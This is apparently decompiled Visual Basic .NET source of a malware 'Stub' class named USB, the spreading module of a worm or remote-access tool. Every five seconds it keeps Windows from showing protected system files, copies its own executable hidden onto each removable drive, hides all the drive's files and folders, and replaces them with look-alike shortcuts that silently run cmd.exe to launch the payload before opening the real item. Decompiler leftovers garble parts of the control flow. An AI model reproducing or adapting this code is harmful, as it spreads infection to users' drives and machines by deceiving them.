Imports System
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports My

Namespace Stub
	' Token: 0x0200000C RID: 12
	Public Class USB
		' Token: 0x06000046 RID: 70 RVA: 0x00004D54 File Offset: 0x00002F54
		Public Shared Sub USBStart()
			Try
				USB.USBThread = AddressOf USB.USBCode
				USB.USBThread.Start()
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000047 RID: 71 RVA: 0x00004DA4 File Offset: 0x00002FA4
		Public Shared Sub USBStop()
			Try
				USB.USBThread.Abort()
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000048 RID: 72 RVA: 0x00004DDC File Offset: 0x00002FDC
		Private Shared Sub USBCode()
			Dim num2 As Integer
			Dim num4 As Integer
			Dim obj3 As Object
			Try
				IL_00:
				Dim num As Integer = 1
				Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("wscript.shell", ""))
				IL_18:
				While True
					IL_74D:
					num = 3
					If Not True Then
						Exit For
					End If
					IL_1D:
					ProjectData.ClearProjectError()
					num2 = 1
					IL_25:
					num = 5
					Dim registryKey As RegistryKey = MyProject.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", True)
					IL_43:
					num = 6
					If Operators.ConditionalCompareObjectEqual(registryKey.GetValue("ShowSuperHidden"), 1, False) Then
						IL_5F:
						num = 7
						registryKey.SetValue("ShowSuperHidden", 0)
					End If
					IL_73:
					num = 9
					Dim drives As DriveInfo() = DriveInfo.GetDrives()
					Dim i As Integer = 0
					While i < drives.Length
						Dim driveInfo As DriveInfo = drives(i)
						IL_8C:
						num = 10
						If driveInfo.IsReady Then
							IL_9B:
							num = 11
							If driveInfo.DriveType = DriveType.Removable Then
								IL_AB:
								num = 12
								Dim name As String = driveInfo.Name
								IL_B6:
								num = 13
								If Not File.Exists(name + Settings.USBNM) Then
									IL_CC:
									num = 14
									File.WriteAllBytes(name + Settings.USBNM, File.ReadAllBytes(Helper.current))
									IL_EA:
									num = 15
									File.SetAttributes(name + Settings.USBNM, FileAttributes.Hidden Or FileAttributes.System)
								End If
								IL_FF:
								num = 17
								Dim files As String() = Directory.GetFiles(name)
								Dim j As Integer = 0
								While j < files.Length
									Dim text As String = files(j)
									IL_11A:
									num = 18
									If Operators.CompareString(Path.GetExtension(text).ToLower(), ".lnk", False) <> 0 And Operators.CompareString(text.ToLower(), name.ToLower() + Settings.USBNM.ToLower(), False) <> 0 Then
										IL_169:
										num = 19
										File.SetAttributes(text, FileAttributes.Hidden Or FileAttributes.System)
										IL_175:
										num = 20
										Dim instance As Object = NewLateBinding.LateGet(objectValue, Nothing, "CreateShortcut", New Object() { name + New FileInfo(text).Name + ".lnk" }, Nothing, Nothing, Nothing)
										IL_1AF:
										num = 21
										NewLateBinding.LateSetComplex(instance, Nothing, "windowstyle", New Object() { 7 }, Nothing, Nothing, False, True)
										IL_1D8:
										num = 22
										NewLateBinding.LateSetComplex(instance, Nothing, "TargetPath", New Object() { "cmd.exe" }, Nothing, Nothing, False, True)
										IL_200:
										num = 23
										NewLateBinding.LateSetComplex(instance, Nothing, "WorkingDirectory", New Object() { "" }, Nothing, Nothing, False, True)
										IL_228:
										num = 24
										NewLateBinding.LateSetComplex(instance, Nothing, "Arguments", New Object() { String.Concat(New String() { "/c start ", Settings.USBNM.Replace(" ", """ """), "&start ", New FileInfo(text).Name.Replace(" ", """ """), " & exit" }) }, Nothing, Nothing, False, True)
										IL_2AC:
										num = 25
										Dim obj As Object = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, Nothing, "regread", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("HKEY_LOCAL_MACHINE\software\classes\", NewLateBinding.LateGet(objectValue, Nothing, "regread", New Object() { "HKEY_LOCAL_MACHINE\software\classes\." + Strings.Split(Path.GetFileName(text), ".", -1, CompareMethod.Binary)(Information.UBound(Strings.Split(Path.GetFileName(text), ".", -1, CompareMethod.Binary), 1)) + "\" }, Nothing, Nothing, Nothing)), "\defaulticon\") }, Nothing, Nothing, Nothing))
										IL_341:
										num = 26
										Dim right As Object = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, Nothing, "CreateShortcut", New Object() { name + New FileInfo(text).Name + ".lnk" }, Nothing, Nothing, Nothing), Nothing, "IconLocation", New Object(-1) {}, Nothing, Nothing, Nothing))
										IL_394:
										num = 27
										If Strings.InStr(Conversions.ToString(obj), ",", CompareMethod.Binary) = 0 Then
											IL_3AD:
											num = 28
											NewLateBinding.LateSetComplex(instance, Nothing, "iconlocation", New Object() { text }, Nothing, Nothing, False, True)
											IL_3D2:
										Else
											IL_3D4:
											num = 30
											IL_3D8:
											num = 31
											NewLateBinding.LateSetComplex(instance, Nothing, "iconlocation", New Object() { RuntimeHelpers.GetObjectValue(obj) }, Nothing, Nothing, False, True)
										End If
										IL_402:
										num = 33
										If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(instance, Nothing, "iconlocation", New Object(-1) {}, Nothing, Nothing, Nothing), right, False))) Then
											IL_430:
											num = 34
											NewLateBinding.LateCall(instance, Nothing, "Save", New Object(-1) {}, Nothing, Nothing, Nothing, True)
										End If
										IL_44C:
										num = 36
										right = Nothing
										IL_453:
										num = 37
										obj = Nothing
										IL_45A:
										instance = Nothing
									End If
									IL_45D:
									j += 1
									IL_463:
									num = 40
								End While
								IL_472:
								num = 41
								Dim directories As String() = Directory.GetDirectories(name)
								Dim k As Integer = 0
								While k < directories.Length
									Dim text2 As String = directories(k)
									IL_48D:
									num = 42
									File.SetAttributes(text2, FileAttributes.Hidden Or FileAttributes.System)
									IL_499:
									num = 43
									Dim instance2 As Object = NewLateBinding.LateGet(objectValue, Nothing, "CreateShortcut", New Object() { name + Path.GetFileNameWithoutExtension(text2) + " .lnk" }, Nothing, Nothing, Nothing)
									IL_4CE:
									num = 44
									NewLateBinding.LateSetComplex(instance2, Nothing, "windowstyle", New Object() { 7 }, Nothing, Nothing, False, True)
									IL_4F7:
									num = 45
									NewLateBinding.LateSetComplex(instance2, Nothing, "TargetPath", New Object() { "cmd.exe" }, Nothing, Nothing, False, True)
									IL_51F:
									num = 46
									NewLateBinding.LateSetComplex(instance2, Nothing, "WorkingDirectory", New Object() { "" }, Nothing, Nothing, False, True)
									IL_547:
									num = 47
									NewLateBinding.LateSetComplex(instance2, Nothing, "arguments", New Object() { String.Concat(New String() { "/c start ", Strings.Replace(Settings.USBNM, " ", """ """, 1, -1, CompareMethod.Binary), "&start explorer ", Strings.Replace(New DirectoryInfo(text2).Name, " ", """ """, 1, -1, CompareMethod.Binary), "&exit" }) }, Nothing, Nothing, False, True)
									IL_5D1:
									num = 48
									Dim obj2 As Object = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, Nothing, "regread", New Object() { "HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\" }, Nothing, Nothing, Nothing))
									IL_5FE:
									num = 49
									Dim right2 As Object = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, Nothing, "CreateShortcut", New Object() { name + Path.GetFileNameWithoutExtension(text2) + " .lnk" }, Nothing, Nothing, Nothing), Nothing, "IconLocation", New Object(-1) {}, Nothing, Nothing, Nothing))
									IL_64C:
									num = 50
									If Strings.InStr(Conversions.ToString(obj2), ",", CompareMethod.Binary) = 0 Then
										IL_665:
										num = 51
										NewLateBinding.LateSetComplex(instance2, Nothing, "IconLocation", New Object() { text2 }, Nothing, Nothing, False, True)
										IL_68A:
									Else
										IL_68C:
										num = 53
										IL_690:
										num = 54
										NewLateBinding.LateSetComplex(instance2, Nothing, "IconLocation", New Object() { RuntimeHelpers.GetObjectValue(obj2) }, Nothing, Nothing, False, True)
									End If
									IL_6BA:
									num = 56
									If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(instance2, Nothing, "iconlocation", New Object(-1) {}, Nothing, Nothing, Nothing), right2, False))) Then
										IL_6E8:
										num = 57
										NewLateBinding.LateCall(instance2, Nothing, "Save", New Object(-1) {}, Nothing, Nothing, Nothing, True)
									End If
									IL_704:
									num = 59
									right2 = Nothing
									IL_70B:
									num = 60
									obj2 = Nothing
									IL_712:
									instance2 = Nothing
									k += 1
									IL_71B:
									num = 62
								End While
							End If
						End If
						IL_72A:
						i += 1
						IL_730:
						num = 65
					End While
					IL_73F:
					num = 66
					Thread.Sleep(5000)
				End While
				IL_756:
				GoTo IL_8C3
				IL_75F:
				Dim num3 As Integer = num4 + 1
				num4 = 0
				switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3)
				IL_87F:
				GoTo IL_8B8
				IL_881:
				num4 = num
				switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num2)
				IL_894:
			Catch obj4 When endfilter(TypeOf obj3 Is Exception And num2 <> 0 And num4 = 0)
				Dim ex As Exception = CType(obj4, Exception)
				GoTo IL_881
			End Try
			IL_8B8:
			Throw ProjectData.CreateProjectError(-2146828237)
			IL_8C3:
			If num4 <> 0 Then
				ProjectData.ClearProjectError()
			End If
		End Sub

		' Token: 0x04000024 RID: 36
		Private Shared USBThread As Thread
	End Class
End Namespace
